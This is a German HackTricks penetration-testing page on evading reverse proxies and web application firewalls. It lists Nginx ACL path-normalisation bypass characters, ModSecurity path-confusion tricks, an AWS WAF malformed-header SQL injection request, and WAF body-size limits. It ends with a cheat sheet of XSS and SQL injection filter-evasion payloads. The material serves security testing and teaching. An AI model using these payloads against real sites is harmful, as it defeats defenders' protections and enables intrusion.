# Proxy / WAF Schutzumgehung

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Umgehung von Nginx ACL-Regeln mit Pfadmanipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Techniken [aus dieser Forschung](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx Regelbeispiel:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Um Umgehungen zu verhindern, f√ºhrt Nginx eine Pfadnormalisierung durch, bevor es diesen √ºberpr√ºft. Wenn der Backend-Server jedoch eine andere Normalisierung vornimmt (Zeichen entfernt, die Nginx nicht entfernt), k√∂nnte es m√∂glich sein, diese Verteidigung zu umgehen.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass-Zeichen** |
| ------------- | --------------------------- |
| 1.22.0        | `\xA0`                      |
| 1.21.6        | `\xA0`                      |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`      |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`      |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`      |

### **Flask**

| Nginx Version | **Flask Bypass-Zeichen**                                      |
| ------------- | ------------------------------------------------------------ |
| 1.22.0        | `\x85`, `\xA0`                                               |
| 1.21.6        | `\x85`, `\xA0`                                               |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass-Zeichen** |
| ------------- | ------------------------------- |
| 1.22.0        | `;`                             |
| 1.21.6        | `;`                             |
| 1.20.2        | `\x09`, `;`                     |
| 1.18.0        | `\x09`, `;`                     |
| 1.16.1        | `\x09`, `;`                     |

### **PHP-FPM**

Nginx FPM-Konfiguration:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx ist so konfiguriert, dass der Zugriff auf `/admin.php` blockiert wird, aber es ist m√∂glich, dies zu umgehen, indem man auf `/admin.php/index.php` zugreift.

### Wie man verhindert
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**In diesem Beitrag**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) wird erkl√§rt, dass ModSecurity v3 (bis 3.0.12) **die `REQUEST_FILENAME`**-Variable unsachgem√§√ü implementiert hat, die den aufgerufenen Pfad (bis zum Beginn der Parameter) enthalten sollte. Dies liegt daran, dass eine URL-Dekodierung durchgef√ºhrt wurde, um den Pfad zu erhalten.\
Daher wird eine Anfrage wie `http://example.com/foo%3f';alert(1);foo=` in Mod Security annehmen, dass der Pfad nur `/foo` ist, da `%3f` in `?` umgewandelt wird, was den URL-Pfad beendet, aber tats√§chlich wird der Pfad, den ein Server erhalten wird, `/foo%3f';alert(1);foo=` sein.

Die Variablen `REQUEST_BASENAME` und `PATH_INFO` waren ebenfalls von diesem Fehler betroffen.

Etwas √Ñhnliches geschah in Version 2 von Mod Security, das es erm√∂glichte, einen Schutz zu umgehen, der verhinderte, dass Benutzer auf Dateien mit bestimmten Erweiterungen, die mit Sicherungsdateien in Verbindung stehen (wie `.bak`), zugreifen konnten, indem einfach der Punkt URL-kodiert in `%2e` gesendet wurde, zum Beispiel: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Diese Forschung](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) erw√§hnt, dass es m√∂glich war, AWS WAF-Regeln, die auf HTTP-Header angewendet wurden, zu umgehen, indem ein "fehlerhafter" Header gesendet wurde, der von AWS nicht richtig analysiert, aber vom Backend-Server verarbeitet wurde.

Zum Beispiel, indem die folgende Anfrage mit einer SQL-Injection im Header X-Query gesendet wird:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Es war m√∂glich, AWS WAF zu umgehen, da es nicht verstand, dass die n√§chste Zeile Teil des Wertes des Headers ist, w√§hrend der NODEJS-Server dies tat (dies wurde behoben).

## Generische WAF-Umgehungen

### Anforderungsgr√∂√üenbeschr√§nkungen

√úblicherweise haben WAFs eine bestimmte L√§ngenbeschr√§nkung f√ºr Anfragen, die √ºberpr√ºft werden, und wenn eine POST/PUT/PATCH-Anfrage dar√ºber hinausgeht, wird die WAF die Anfrage nicht √ºberpr√ºfen.

* F√ºr AWS WAF k√∂nnen Sie [**die Dokumentation √ºberpr√ºfen**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maximale Gr√∂√üe eines Webanfragek√∂rpers, die f√ºr Application Load Balancer und AWS AppSync-Schutzma√ünahmen √ºberpr√ºft werden kann</td><td>8 KB</td></tr><tr><td>Maximale Gr√∂√üe eines Webanfragek√∂rpers, die f√ºr CloudFront, API Gateway, Amazon Cognito, App Runner und Verified Access-Schutzma√ünahmen √ºberpr√ºft werden kann**</td><td>64 KB</td></tr></tbody></table>

* Aus [**Azure-Dokumenten**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

√Ñltere Webanwendungsfirewalls mit Core Rule Set 3.1 (oder niedriger) erlauben Nachrichten gr√∂√üer als **128 KB**, indem die Inspektion des Anfragek√∂rpers deaktiviert wird, aber diese Nachrichten werden nicht auf Schwachstellen √ºberpr√ºft. F√ºr neuere Versionen (Core Rule Set 3.2 oder neuer) kann dasselbe erreicht werden, indem die maximale Anfragek√∂rpergrenze deaktiviert wird. Wenn eine Anfrage die Gr√∂√üenbeschr√§nkung √ºberschreitet:

Wenn **Pr√§ventionsmodus**: Protokolliert und blockiert die Anfrage.\
Wenn **Erkennungsmodus**: √úberpr√ºft bis zur Grenze, ignoriert den Rest und protokolliert, wenn die `Content-Length` die Grenze √ºberschreitet.

* Aus [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Standardm√§√üig √ºberpr√ºft die WAF nur die ersten 8KB einer Anfrage. Sie kann das Limit auf bis zu 128KB erh√∂hen, indem sie erweiterte Metadaten hinzuf√ºgt.

* Aus [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Bis zu 128KB.

### Obfuskation <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode-Kompatibilit√§t <a href="#unicode-compatability" id="unicode-compatability"></a>

Je nach Implementierung der Unicode-Normalisierung (mehr Informationen [hier](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)) k√∂nnen Zeichen, die Unicode-Kompatibilit√§t aufweisen, in der Lage sein, die WAF zu umgehen und als die beabsichtigte Nutzlast auszuf√ºhren. Kompatible Zeichen finden Sie [hier](https://www.compart.com/en/unicode).

#### Beispiel <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generiere eine API-Gateway-URL zur Verwendung mit ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): √Ñhnlich wie fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite-Plugin, das API-Gateway-IPs verwendet
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Eine dynamisch bestimmte Anzahl von Containerinstanzen wird basierend auf der Gr√∂√üe der Eingabedatei und dem Split-Faktor aktiviert, wobei die Eingabe in Teile f√ºr die parallele Ausf√ºhrung aufgeteilt wird, z. B. 100 Instanzen, die 100 Teile aus einer 10.000-Zeilen-Eingabedatei mit einem Split-Faktor von 100 Zeilen verarbeiten.

### Regex Bypasses

Verschiedene Techniken k√∂nnen verwendet werden, um die Regex-Filter an den Firewalls zu umgehen. Beispiele sind wechselnde Gro√ü- und Kleinschreibung, das Hinzuf√ºgen von Zeilenumbr√ºchen und das Kodieren von Payloads. Ressourcen f√ºr die verschiedenen Bypasses finden Sie bei [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) und [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). Die folgenden Beispiele stammen aus [diesem Artikel](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Tools

* [**nowafpls**](https://github.com/assetnote/nowafpls): Burp-Plugin, um Junk-Daten zu Anfragen hinzuzuf√ºgen, um WAFs durch L√§nge zu umgehen

## References

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
